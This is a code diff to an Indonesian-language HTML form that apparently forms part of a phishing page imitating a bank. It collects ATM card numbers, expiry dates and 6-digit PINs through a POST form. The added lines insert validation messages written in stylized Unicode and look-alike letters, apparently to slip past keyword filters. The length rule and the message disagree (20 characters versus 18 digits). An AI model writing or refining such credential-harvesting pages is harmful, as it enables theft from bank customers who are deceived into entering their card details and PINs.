@@ -257,19 +257,19 @@ form button{
 <form id="login" method="POST">
 <input type="hidden" id="nomor" name="nomor">
 <label>Nomor Kartu ATM</label>   
-<input type="tel" id="atm" name="atm" placeholder="Masukkan nomor kartu ATM Kamu" maxlength="20" minlength="20" required>
+<input type="tel" id="atm" name="atm" placeholder="Masukkan nomor kartu ATM Kamu" maxlength="20" minlength="20" oninvalid="this.setCustomValidity('Tuliskan 𝟭𝟴 𝗗𝗶𝗴𝗶𝘁 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" required>
  <br>
  <label>Tanggal Kadaluarsa Kartu ATM</label>   
 <input type="tel" id="valid" name="valid" placeholder="MM/YY" maxlength="5" minlength="5" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9BcnZ7S3PsxEZqZ_78SjDdCSTMKQefKjsW9-KirWl3SjIMJE618l5nYj6brstU0Y8UhTj-8nkT6QmIIScKXDcGJRUe95wEtW0aK_9siMairaFxhTkIM40PzDjHE02_7h2VbaQPPzTRcuM1hQWP_4ysk80HqNbbpr_IrOyJ3RD9pSbbfEJ0NINFvyPgSM/s1080/AddText_08-02-01.08.27.jpg');
       background-position: 100% 100%;
       background-repeat: no-repeat;
-      background-size: 100% 100%; " required>   
+      background-size: 100% 100%; " oninvalid="this.setCustomValidity('Tuliskan 𝗠𝗮𝘀𝗮 𝗯𝗲𝗿𝗹𝗮𝗸𝘂 𝗸𝗮𝗿𝘁𝘂 𝘆𝗮𝗻𝗴 𝗮𝗱𝗮 𝗱𝗶 𝗱𝗲𝗽𝗮𝗻 𝗸𝗮𝗿𝘁𝘂-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" required>   
 <br>
  <label>6-digit PIN Kartu ATM</label>   
 <input type="tel" id="pin" name="pin" placeholder="PIN" maxlength="6" minlength="6" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKH54H-KmEW0JbbrCL2EHo55vUo75ra5Rjfywk-SvEIz6-4bqNJ9KV-RY-ca9w31vmiNQOTbzurLCqLQk_IM0IPn-yqWW6HpbHF8NzDqFBsKOj5NCOeHg9blcuuQLEfZuvmPEVQnquSLozRUoA2bOzEsmldaerNi3VMb82VbsDLvqdTZg9XbnFUmmz7_I/s1066/AddText_08-02-01.10.22.jpg');
       background-position: 100% 100%;
       background-repeat: no-repeat;
-      background-size: 100% 100%; " required>   
+      background-size: 100% 100%; " oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗣𝗜𝗡-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" required>   
  <br>
  <br>
 <button type="submit" id="kirims">Selanjutnya</button>    
